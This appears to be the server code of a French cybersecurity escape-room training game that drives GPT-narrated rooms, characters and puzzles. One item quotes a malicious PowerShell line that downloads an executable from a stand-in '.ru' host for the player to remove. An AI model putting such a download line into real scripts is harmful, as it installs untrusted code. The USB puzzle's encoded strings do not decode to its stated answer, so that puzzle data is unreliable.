import { Request, Response } from "express";
import { openAIService } from "./services/openai";
import { ChatCompletionRequestMessage } from "@shared/schema";

/**
 * Interface pour la requête du jeu Cyber Escape
 */
interface CyberEscapeRequest {
  action: string;
  room: {
    id: string;
    name: string;
  };
  npc?: {
    id: string;
    name: string;
    role: string;
    traits: string[];
  };
  item?: {
    id: string;
    name: string;
    type: 'document' | 'password' | 'tool' | 'clue';
  };
  userInput?: string;
  gameState: {
    currentRoom: string;
    visitedRooms: string[];
    inventory: Array<{
      id: string;
      name: string;
      type: string;
      discovered: boolean;
    }>;
    unlockedRooms: string[];
    budget: number;
    timeRemaining: number;
    events: string[];
    puzzlesSolved: string[];
  };
}

/**
 * Interface pour une interaction avec un PNJ
 */
interface NPCInteractionRequest {
  npcId: string;
  userInput: string;
  conversationHistory: Array<{
    sender: 'player' | 'npc' | 'system';
    content: string;
  }>;
  gameState: any;
}

/**
 * Interface pour le décodage d'un élément chiffré
 */
interface DecodeItemRequest {
  itemId: string;
  decodeMethod: string;
  userInput: string;
  gameState: any;
}

/**
 * Gère l'entrée dans une nouvelle salle dans le jeu Cyber Escape
 */
export async function enterRoom(req: Request, res: Response) {
  try {
    const data: CyberEscapeRequest = req.body;

    if (!data.room || !data.gameState) {
      return res.status(400).json({ 
        error: "Données manquantes pour l'entrée dans la salle" 
      });
    }

    // Mettre à jour le gameState
    const updatedGameState = {
      ...data.gameState,
      currentRoom: data.room.id,
      visitedRooms: [...data.gameState.visitedRooms, data.room.id].filter(
        (value, index, self) => self.indexOf(value) === index
      )
    };

    // Construction du prompt pour GPT
    let systemPrompt = `Tu es le narrateur d'un jeu d'escape room cybersécurité appelé "Cyber Escape - Le Pare-feu est tombé". 
    
Le joueur vient d'entrer dans la salle: ${data.room.name}.

Voici les informations sur l'état actuel du jeu:
- Budget restant: ${updatedGameState.budget} crédits
- Temps restant: ${updatedGameState.timeRemaining} minutes
- Salles visitées: ${updatedGameState.visitedRooms.join(', ')}
- Salles déverrouillées: ${updatedGameState.unlockedRooms.join(', ')}
- Inventaire: ${updatedGameState.inventory.map(i => i.name).join(', ') || 'Vide'}
- Événements déjà déclenchés: ${updatedGameState.events.join(', ') || 'Aucun'}
- Énigmes résolues: ${updatedGameState.puzzlesSolved.join(', ') || 'Aucune'}

DESCRIPTION DE LA SALLE:
`;

    // Ajout de la description spécifique selon la salle
    switch (data.room.id) {
      case 'hub':
        systemPrompt += `Hub central de sécurité. C'est le point de départ de l'escape game. 
La salle dispose de plusieurs portes menant vers d'autres zones (RH, IT, Support, Direction).
Il y a une console centrale qui affiche l'état du réseau et un chronomètre indiquant le temps restant avant que le malware ne prenne contrôle total du système.
Une alerte indique qu'un malware inconnu a pénétré le réseau et que les accès sont limités.`;
        break;
      case 'rh':
        systemPrompt += `Service des Ressources Humaines. 
Eddy y travaille comme Responsable RH et semble stressé.
Il y a un ordinateur allumé avec un client mail ouvert.
Des CVs sont disposés sur le bureau.
Un document intitulé "Candidatures_2023.docm" est visible.`;
        break;
      case 'it':
        systemPrompt += `Service Informatique. 
Neil, le DSI, est en train de travailler frénétiquement sur son ordinateur.
Il y a des écrans montrant des logs serveur.
Un fichier "check_update.ps1" est ouvert dans un éditeur.
Un panneau de contrôle du firewall est accessible.`;
        break;
      case 'support':
        systemPrompt += `Centre de Support Technique. 
Yousra, technicienne réseau, est présente mais semble peu concernée par la situation.
Il y a une rangée d'ordinateurs, certains semblent isolés du réseau.
Une clé USB est visible sur l'un des bureaux.
Un tableau affiche des tickets d'incidents en cours.`;
        break;
      case 'direction':
        systemPrompt += `Bureau de la Direction. 
Guillaume, le Directeur Général, attend des explications sur la situation.
Son ordinateur affiche un écran de ransomware.
Un document confidentiel "Ordre_redemarrage_systemes.pdf" est sur son bureau.
L'accès à la salle finale est verrouillé par un système de sécurité avancé.`;
        break;
      case 'salle-chiffree':
        systemPrompt += `Salle de serveurs chiffrée. 
Cette salle contient le cœur du système d'information.
Plusieurs serveurs sont verrouillés par un ransomware.
Un terminal central permet de saisir un code de récupération.
C'est ici que le joueur peut mettre fin à l'attaque s'il a collecté tous les éléments nécessaires.`;
        break;
      default:
        systemPrompt += `Une salle inconnue du complexe. Soyez sur vos gardes.`;
    }

    systemPrompt += `

INSTRUCTIONS:
1. Décris la salle de manière immersive en 3-5 phrases.
2. Mentionne les éléments interactifs visibles (personnes, objets, écrans).
3. Donne un indice subtil sur ce que le joueur doit chercher ou à qui parler.
4. N'inclus AUCUNE instruction de jeu ou méta-information.

Réponds au format JSON suivant sans aucun autre texte autour:
{
  "description": "Description immersive de la salle",
  "visibleElements": ["Élément 1", "Élément 2", ...],
  "npcs": ["Nom du PNJ 1", "Nom du PNJ 2", ...],
  "possibleActions": ["Action possible 1", "Action possible 2", ...],
  "hint": "Un indice subtil pour aider le joueur"
}`;

    // Appel à OpenAI
    const messages: ChatCompletionRequestMessage[] = [
      { role: 'system', content: systemPrompt }
    ];
    
    const response = await openAIService.getChatCompletion(messages);
    
    try {
      const parsedResponse = JSON.parse(response);
      return res.json({
        roomData: parsedResponse,
        gameState: updatedGameState
      });
    } catch (parseError: unknown) {
      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
      return res.status(500).json({ 
        error: "Format de réponse invalide",
        details: parseError instanceof Error ? parseError.message : "Erreur inconnue"
      });
    }
  } catch (error: any) {
    console.error("Erreur dans enterRoom:", error);
    return res.status(500).json({ 
      error: "Erreur lors de l'entrée dans la salle",
      details: error.message
    });
  }
}

/**
 * Gère l'interaction avec un PNJ dans le jeu Cyber Escape
 */
export async function interactWithNPC(req: Request, res: Response) {
  try {
    const data: NPCInteractionRequest = req.body;

    if (!data.npcId || !data.userInput || !data.gameState) {
      return res.status(400).json({ 
        error: "Données manquantes pour l'interaction avec le PNJ" 
      });
    }

    // Déterminer les caractéristiques du PNJ en fonction de son ID
    let npcProfile = {
      name: "",
      role: "",
      personality: "",
      knowledge: "",
      helpCondition: "",
      secretToReveal: ""
    };

    switch (data.npcId) {
      case 'eddy':
        npcProfile = {
          name: "Eddy",
          role: "Responsable RH",
          personality: "Stressé, peu technique, craintif",
          knowledge: "A reçu un mail suspect avec une pièce jointe qui pourrait être l'origine de l'attaque",
          helpCondition: "Être rassuré et ne pas être jugé pour avoir peut-être ouvert un fichier suspect",
          secretToReveal: "Le mot de passe est caché dans les métadonnées du document Candidatures_2023.docm"
        };
        break;
      case 'neil':
        npcProfile = {
          name: "Neil",
          role: "DSI",
          personality: "Technique, factuel, exigeant",
          knowledge: "Peut examiner les logs et identifier l'IP malveillante, connaît l'accès au support",
          helpCondition: "Recevoir une analyse pertinente ou l'identification correcte d'une connexion suspecte",
          secretToReveal: "L'accès à la salle Support et l'identification d'une IP suspecte dans les logs"
        };
        break;
      case 'yousra':
        npcProfile = {
          name: "Yousra",
          role: "Technicienne Support",
          personality: "Compétente mais paresseuse, motivée par les récompenses",
          knowledge: "Possède une clé USB cryptée contenant des informations cruciales",
          helpCondition: "Recevoir 150 crédits et un plan clair",
          secretToReveal: "Une clé USB avec un fichier chiffré à décoder par ROT13 puis Base64"
        };
        break;
      case 'guillaume':
        npcProfile = {
          name: "Guillaume",
          role: "Directeur Général",
          personality: "Autoritaire, orienté business, impatient",
          knowledge: "Peut autoriser l'accès à la salle finale, connaît l'ordre de redémarrage des systèmes",
          helpCondition: "Recevoir une explication claire et professionnelle de la situation",
          secretToReveal: "L'ordre correct de redémarrage des systèmes est : Sauvegarde > ERP > Mail"
        };
        break;
      case 'fares':
        npcProfile = {
          name: "Fares",
          role: "Collègue suspect",
          personality: "Trop serviable, évasif",
          knowledge: "Est en réalité un imposteur qui tente de saboter les efforts du joueur",
          helpCondition: "N/A - C'est un piège",
          secretToReveal: "N/A - Toute interaction entraîne une perte de 300 crédits"
        };
        break;
      default:
        npcProfile = {
          name: "Inconnu",
          role: "Personnel non identifié",
          personality: "Neutre, méfiant",
          knowledge: "Informations limitées",
          helpCondition: "Gagner sa confiance",
          secretToReveal: "Aucune information particulière"
        };
    }
    
    // Construction du prompt pour GPT
    const systemPrompt = `Tu simules un PNJ nommé ${npcProfile.name} dans un jeu d'escape game cybersécurité "Cyber Escape - Le Pare-feu est tombé". Tu dois rester parfaitement dans le personnage sans jamais briser l'immersion.

PROFIL DU PERSONNAGE:
- Nom: ${npcProfile.name}
- Rôle: ${npcProfile.role}
- Personnalité: ${npcProfile.personality}
- Connaissances: ${npcProfile.knowledge}
- Condition d'aide: ${npcProfile.helpCondition}
- Secret à révéler si conditions remplies: ${npcProfile.secretToReveal}

CONTEXTE DU JEU:
- Un malware a pénétré le réseau de l'entreprise
- Le joueur est un responsable cybersécurité qui doit résoudre la crise
- Puzzles résolus: ${data.gameState.puzzlesSolved.join(', ') || 'Aucun'}
- Inventaire du joueur: ${data.gameState.inventory.map((i: any) => i.name).join(', ') || 'Vide'}
- Budget restant: ${data.gameState.budget} crédits

INSTRUCTIONS:
1. Réponds comme le ferait ce personnage spécifique, avec son vocabulaire et ses tics de langage.
2. Si le joueur pose les bonnes questions ou remplit tes conditions d'aide, révèle progressivement des indices.
3. Si le joueur est trop direct ou agressif, réagis selon ta personnalité (stress, méfiance, etc.).
4. N'invente pas d'informations qui ne sont pas dans ton profil.
5. Si le PNJ est Fares, n'importe quelle interaction substantielle (sauf questions basiques) déclenche le piège.

Réponds au format JSON suivant sans aucun autre texte autour:
{
  "dialogue": "La réponse du PNJ",
  "attitude": "Attitude du PNJ (amical, méfiant, stressé, etc.)",
  "revealedClue": "Indice révélé (vide si aucun)",
  "triggerEvent": "Événement déclenché (vide si aucun)",
  "revealedItem": "Objet révélé (vide si aucun)",
  "costInCredits": 0
}`;

    // Conversion de l'historique des messages
    const conversationContext: ChatCompletionRequestMessage[] = data.conversationHistory?.map(msg => {
      const role = msg.sender === 'player' ? 'user' as const : 
                 (msg.sender === 'npc' ? 'assistant' as const : 'system' as const);
      return {
        role,
        content: msg.content
      };
    }) || [];

    // Création du tableau de messages pour l'API
    const messages: ChatCompletionRequestMessage[] = [
      { role: 'system', content: systemPrompt },
      ...conversationContext,
      { role: 'user', content: data.userInput }
    ];
    
    // Appel à OpenAI
    const response = await openAIService.getChatCompletion(messages);
    
    try {
      const parsedResponse = JSON.parse(response);
      
      // Mise à jour de l'état du jeu
      const updatedGameState = { ...data.gameState };
      
      // Si des crédits sont dépensés
      if (parsedResponse.costInCredits && parsedResponse.costInCredits > 0) {
        updatedGameState.budget -= parsedResponse.costInCredits;
      }
      
      // Si un événement est déclenché
      if (parsedResponse.triggerEvent && parsedResponse.triggerEvent !== "") {
        updatedGameState.events = [...updatedGameState.events, parsedResponse.triggerEvent];
      }
      
      // Si un objet est révélé
      if (parsedResponse.revealedItem && parsedResponse.revealedItem !== "") {
        const newItem = {
          id: parsedResponse.revealedItem.toLowerCase().replace(/\s+/g, '-'),
          name: parsedResponse.revealedItem,
          type: 'clue',
          discovered: true
        };
        
        // Vérifier si l'objet n'est pas déjà dans l'inventaire
        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
          updatedGameState.inventory.push(newItem);
        }
      }
      
      return res.json({
        response: parsedResponse,
        gameState: updatedGameState
      });
    } catch (parseError) {
      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
      return res.status(500).json({ 
        error: "Format de réponse invalide",
        details: parseError.message
      });
    }
  } catch (error: any) {
    console.error("Erreur dans interactWithNPC:", error);
    return res.status(500).json({ 
      error: "Erreur lors de l'interaction avec le PNJ",
      details: error.message
    });
  }
}

/**
 * Gère l'interaction avec un objet dans le jeu Cyber Escape
 */
export async function interactWithItem(req: Request, res: Response) {
  try {
    const data: CyberEscapeRequest = req.body;

    if (!data.item || !data.gameState) {
      return res.status(400).json({ 
        error: "Données manquantes pour l'interaction avec l'objet" 
      });
    }

    // Construction du prompt selon l'objet
    let systemPrompt = `Tu es le narrateur d'un jeu d'escape room cybersécurité. Le joueur interagit avec l'objet: ${data.item.name}.

Voici le contexte du jeu:
- Salles visitées: ${data.gameState.visitedRooms.join(', ')}
- Inventaire: ${data.gameState.inventory.map((i: any) => i.name).join(', ') || 'Vide'}
- Énigmes résolues: ${data.gameState.puzzlesSolved.join(', ') || 'Aucune'}

DESCRIPTION DE L'OBJET:
`;

    // Déterminer les caractéristiques de l'objet
    let itemIsDangerous = false;
    let itemHasPassword = false;
    let itemRequiresDecoding = false;
    let password = "";
    let itemUnlocksRoom = "";

    switch (data.item.id) {
      case 'candidatures-2023.docm':
        systemPrompt += `Un document Word contenant des CV. Ce fichier est potentiellement dangereux s'il est ouvert directement, mais ses métadonnées contiennent un mot de passe utile.`;
        itemIsDangerous = true;
        itemHasPassword = true;
        password = "P4ssw0rd";
        break;
      case 'logs-serveur':
        systemPrompt += `Des logs de connexion au serveur. En les analysant attentivement, on peut repérer une connexion suspecte à 03:44 depuis l'IP 185.191.127.43.`;
        itemHasPassword = true;
        password = "127.43_03:44";
        break;
      case 'check-update.ps1':
        systemPrompt += `Un script PowerShell contenant une ligne malveillante: Invoke-WebRequest -Uri "http://updateme.ru/agent.exe". Cette ligne doit être supprimée ou remplacée.`;
        itemIsDangerous = true;
        break;
      case 'cle-usb':
        systemPrompt += `Une clé USB contenant un fichier chiffré. Le contenu est d'abord encodé en ROT13 ("Vafgnapr vf zl anzr") puis en Base64 ("SW5jaWRlbnQgaW4gY29ycmVjdCBzZWN0aW9u").`;
        itemRequiresDecoding = true;
        itemHasPassword = true;
        password = "InnocentCore";
        break;
      case 'ordre-redemarrage':
        systemPrompt += `Un document détaillant l'ordre correct de redémarrage des systèmes critiques. L'ordre optimal est: Sauvegarde > ERP > Mail.`;
        itemUnlocksRoom = "salle-chiffree";
        break;
      case 'terminal-final':
        systemPrompt += `Un terminal nécessitant la combinaison de trois mots de passe découverts précédemment pour déverrouiller le système et stopper l'attaque.`;
        break;
      default:
        systemPrompt += `Un objet qui pourrait contenir des informations utiles.`;
    }

    systemPrompt += `

INSTRUCTIONS:
1. Décris l'interaction avec l'objet de manière immersive en 2-3 phrases.
2. Si l'objet est dangereux, indique subtilement un risque.
3. Si l'objet contient un indice ou mot de passe, donne un indice sur comment le trouver.
4. Si l'objet nécessite un décodage, suggère la méthode.
5. Reste immersif, n'inclus aucune instruction de jeu directe.

Réponds au format JSON suivant sans aucun autre texte autour:
{
  "description": "Description de l'interaction avec l'objet",
  "isDangerous": ${itemIsDangerous},
  "containsPassword": ${itemHasPassword},
  "requiresDecoding": ${itemRequiresDecoding},
  "revealedPassword": "${itemHasPassword ? password : ''}",
  "unlocksRoom": "${itemUnlocksRoom}",
  "triggerEvent": "",
  "hint": "Un indice sur comment utiliser ou comprendre l'objet"
}`;

    // Appel à OpenAI
    const messages: ChatCompletionRequestMessage[] = [
      { role: 'system', content: systemPrompt }
    ];
    
    const response = await openAIService.getChatCompletion(messages);
    
    try {
      const parsedResponse = JSON.parse(response);
      
      // Mise à jour de l'état du jeu
      const updatedGameState = { ...data.gameState };
      
      // Si un mot de passe est révélé
      if (parsedResponse.revealedPassword && parsedResponse.revealedPassword !== "") {
        const newItem = {
          id: `password-${parsedResponse.revealedPassword.toLowerCase().replace(/\s+/g, '-')}`,
          name: `Mot de passe: ${parsedResponse.revealedPassword}`,
          type: 'password',
          discovered: true
        };
        
        // Vérifier si le mot de passe n'est pas déjà dans l'inventaire
        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
          updatedGameState.inventory.push(newItem);
        }
      }
      
      // Si une salle est déverrouillée
      if (parsedResponse.unlocksRoom && parsedResponse.unlocksRoom !== "") {
        if (!updatedGameState.unlockedRooms.includes(parsedResponse.unlocksRoom)) {
          updatedGameState.unlockedRooms.push(parsedResponse.unlocksRoom);
        }
      }
      
      // Si un événement est déclenché
      if (parsedResponse.triggerEvent && parsedResponse.triggerEvent !== "") {
        updatedGameState.events.push(parsedResponse.triggerEvent);
        
        // Si l'événement est dangereux, réduire le temps
        if (parsedResponse.isDangerous && parsedResponse.triggerEvent.includes("malware")) {
          updatedGameState.timeRemaining = Math.max(0, updatedGameState.timeRemaining - 5);
        }
      }
      
      return res.json({
        response: parsedResponse,
        gameState: updatedGameState
      });
    } catch (parseError) {
      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
      return res.status(500).json({ 
        error: "Format de réponse invalide",
        details: parseError.message
      });
    }
  } catch (error: any) {
    console.error("Erreur dans interactWithItem:", error);
    return res.status(500).json({ 
      error: "Erreur lors de l'interaction avec l'objet",
      details: error.message
    });
  }
}

/**
 * Vérifie une solution à un puzzle
 */
export async function solvePuzzle(req: Request, res: Response) {
  try {
    const { puzzleId, proposedSolution, gameState } = req.body;

    if (!puzzleId || !proposedSolution || !gameState) {
      return res.status(400).json({ 
        error: "Données manquantes pour la résolution du puzzle" 
      });
    }

    // Vérifier la solution en fonction de l'ID du puzzle
    let isCorrect = false;
    let reward = null;
    let unlockRoom = null;
    let feedback = "";

    switch (puzzleId) {
      case 'ip-suspecte':
        isCorrect = proposedSolution.includes('185.191.127.43');
        reward = { 
          id: 'acces-logs',
          name: 'Accès aux logs complets',
          type: 'tool'
        };
        feedback = isCorrect 
          ? "Excellente analyse ! Cette IP n'appartient pas à notre plage réseau habituelle."
          : "Cette IP ne semble pas être la source du problème. Regardez attentivement les connexions nocturnes.";
        break;
      case 'script-powershell':
        isCorrect = !proposedSolution.includes('updateme.ru');
        reward = {
          id: 'script-secure',
          name: 'Script sécurisé',
          type: 'tool'
        };
        feedback = isCorrect 
          ? "Vous avez neutralisé le code malveillant qui téléchargeait un exécutable non autorisé."
          : "Le script contient toujours du code qui tente de télécharger un fichier depuis un domaine suspect.";
        break;
      case 'decode-usb':
        // Le mot est "InnocentCore" après décodage
        isCorrect = proposedSolution.toLowerCase() === 'innocentcore';
        reward = {
          id: 'cle-dechiffrement',
          name: 'Clé de déchiffrement',
          type: 'password'
        };
        feedback = isCorrect 
          ? "Décodage réussi ! Vous avez extrait la clé de déchiffrement des données."
          : "Le résultat du décodage n'est pas correct. Essayez d'appliquer ROT13 puis Base64.";
        break;
      case 'ordre-redemarrage':
        isCorrect = proposedSolution.toLowerCase().includes('sauvegarde') && 
                   proposedSolution.toLowerCase().includes('erp') && 
                   proposedSolution.toLowerCase().includes('mail') &&
                   proposedSolution.indexOf('sauvegarde') < proposedSolution.indexOf('erp') &&
                   proposedSolution.indexOf('erp') < proposedSolution.indexOf('mail');
        unlockRoom = 'salle-chiffree';
        feedback = isCorrect 
          ? "Stratégie optimale ! Cette séquence de redémarrage préserve l'intégrité des données tout en restaurant les services critiques."
          : "Cet ordre de redémarrage pourrait entraîner des pertes de données ou compromettre la sécurité.";
        break;
      case 'mot-passe-final':
        // Combinaison des 3 mots de passe
        const passwords = ['P4ssw0rd', '127.43_03:44', 'InnocentCore'];
        isCorrect = passwords.every(pw => proposedSolution.includes(pw));
        reward = {
          id: 'acces-final',
          name: 'Accès administrateur système',
          type: 'tool'
        };
        feedback = isCorrect 
          ? "Authentification administrateur validée ! Vous avez maintenant le contrôle complet du système."
          : "Authentification échouée. Assurez-vous d'avoir collecté et combiné tous les mots de passe nécessaires.";
        break;
      default:
        feedback = "Ce puzzle n'est pas reconnu par le système.";
    }

    // Mise à jour de l'état du jeu
    const updatedGameState = { ...gameState };
    
    if (isCorrect) {
      // Ajouter le puzzle résolu
      if (!updatedGameState.puzzlesSolved.includes(puzzleId)) {
        updatedGameState.puzzlesSolved.push(puzzleId);
      }
      
      // Ajouter la récompense à l'inventaire
      if (reward) {
        const newItem = {
          ...reward,
          discovered: true
        };
        
        if (!updatedGameState.inventory.some((item: any) => item.id === newItem.id)) {
          updatedGameState.inventory.push(newItem);
        }
      }
      
      // Déverrouiller une salle si nécessaire
      if (unlockRoom && !updatedGameState.unlockedRooms.includes(unlockRoom)) {
        updatedGameState.unlockedRooms.push(unlockRoom);
      }
    }
    
    return res.json({
      isCorrect,
      feedback,
      gameState: updatedGameState
    });
  } catch (error: any) {
    console.error("Erreur dans solvePuzzle:", error);
    return res.status(500).json({ 
      error: "Erreur lors de la vérification de la solution",
      details: error.message
    });
  }
}

/**
 * Génère une analyse finale du joueur
 */
export async function generatePlayerProfile(req: Request, res: Response) {
  try {
    const { gameState } = req.body;

    if (!gameState) {
      return res.status(400).json({ 
        error: "Données manquantes pour la génération du profil" 
      });
    }

    // Construction du prompt pour GPT
    const systemPrompt = `Tu es un expert en cybersécurité qui évalue le comportement d'un joueur dans un escape game cyber. Rédige une fiche profil à partir de ses décisions.

DONNÉES DE LA PARTIE:
- Temps restant à la fin: ${gameState.timeRemaining} minutes
- Budget restant: ${gameState.budget} crédits
- Salles visitées: ${gameState.visitedRooms.join(', ')}
- Inventaire final: ${gameState.inventory.map((i: any) => i.name).join(', ')}
- Puzzles résolus: ${gameState.puzzlesSolved.join(', ')}
- Événements déclenchés: ${gameState.events.join(', ')}

INSTRUCTIONS:
Crée un profil professionnel qui analyse les compétences et le style du joueur.
Structure le profil comme suit:
1. Profil global (3 lignes max)
2. Forces (3 bullets max)
3. Axes de progression (3 bullets max)
4. Badge final (titre + 1 phrase de justification)

Ne donne aucun score. Adopte un ton professionnel et orienté progression.
Sois précis et spécifique dans tes observations, en te basant uniquement sur les données fournies.

Réponds au format JSON suivant sans aucun autre texte autour:
{
  "profileTitle": "Titre du profil",
  "profileSummary": "Résumé du profil (3 lignes)",
  "strengths": ["Force 1", "Force 2", "Force 3"],
  "improvementAreas": ["Axe d'amélioration 1", "Axe d'amélioration 2", "Axe d'amélioration 3"],
  "badge": {
    "title": "Titre du badge",
    "description": "Justification du badge"
  }
}`;

    // Appel à OpenAI
    const messages: ChatCompletionRequestMessage[] = [
      { role: 'system', content: systemPrompt }
    ];
    
    const response = await openAIService.getChatCompletion(messages);
    
    try {
      const parsedResponse = JSON.parse(response);
      return res.json(parsedResponse);
    } catch (parseError) {
      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
      return res.status(500).json({ 
        error: "Format de réponse invalide",
        details: parseError.message
      });
    }
  } catch (error: any) {
    console.error("Erreur dans generatePlayerProfile:", error);
    return res.status(500).json({ 
      error: "Erreur lors de la génération du profil",
      details: error.message
    });
  }
}

/**
 * Initialise une nouvelle partie du jeu Cyber Escape
 */
export async function initializeGame(req: Request, res: Response) {
  try {
    const { difficulty = 'normal' } = req.body;
    
    // Paramètres initiaux selon la difficulté
    let initialBudget = 1000;
    let initialTime = 45;
    
    if (difficulty === 'easy') {
      initialBudget = 1200;
      initialTime = 60;
    } else if (difficulty === 'hard') {
      initialBudget = 800;
      initialTime = 30;
    }
    
    // État initial du jeu
    const gameState = {
      currentRoom: 'hub',
      visitedRooms: ['hub'],
      inventory: [],
      unlockedRooms: ['hub', 'rh', 'it'],  // Au début, seuls le hub, RH et IT sont accessibles
      budget: initialBudget,
      timeRemaining: initialTime,
      events: [],
      puzzlesSolved: [],
      difficulty
    };
    
    // Description de la mission
    const systemPrompt = `Tu es le narrateur d'un jeu d'escape room cybersécurité appelé "Cyber Escape - Le Pare-feu est tombé". Génère un briefing initial de mission pour le joueur qui incarne un Responsable Cybersécurité devant gérer une crise.

Le joueur commence avec:
- Budget: ${initialBudget} crédits
- Temps: ${initialTime} minutes
- Difficulté: ${difficulty}

INSTRUCTIONS:
1. Crée un briefing concis mais immersif expliquant la situation d'urgence.
2. Mentionne qu'un malware inconnu a pénétré le réseau de l'entreprise.
3. Explique que le joueur dispose d'un budget limité et d'un temps limité avant que le malware ne prenne le contrôle total.
4. Indique que le joueur commence dans le hub central et peut accéder aux départements RH et IT.
5. Donne un conseil subtil pour guider les premiers pas.

Réponds au format JSON suivant sans aucun autre texte autour:
{
  "title": "Titre de la mission",
  "briefing": "Briefing de la mission",
  "initialObjectives": ["Objectif 1", "Objectif 2", "Objectif 3"],
  "tips": ["Conseil 1", "Conseil 2"]
}`;

    // Appel à OpenAI
    const messages: ChatCompletionRequestMessage[] = [
      { role: 'system', content: systemPrompt }
    ];
    
    const response = await openAIService.getChatCompletion(messages);
    
    try {
      const parsedResponse = JSON.parse(response);
      return res.json({
        mission: parsedResponse,
        gameState
      });
    } catch (parseError) {
      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
      return res.status(500).json({ 
        error: "Format de réponse invalide",
        details: parseError.message
      });
    }
  } catch (error: any) {
    console.error("Erreur dans initializeGame:", error);
    return res.status(500).json({ 
      error: "Erreur lors de l'initialisation du jeu",
      details: error.message
    });
  }
}